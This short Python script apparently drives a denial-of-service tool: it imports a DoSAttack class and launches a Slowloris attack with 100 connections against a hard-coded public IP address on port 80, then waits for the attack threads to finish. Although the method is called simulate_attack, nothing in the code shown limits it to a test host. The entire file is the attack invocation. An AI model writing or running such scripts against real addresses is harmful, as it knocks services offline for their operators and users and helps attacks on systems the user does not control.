from src.dos_attack import DoSAttack  # change this to import from panthon

dos = DoSAttack(
    "44.228.249.3", num_connections=100, attack_type="Slowloris", target_port=80
)  # target_url, num_connections, attack_type
dos.simulate_attack()
dos.wait_for_threads()
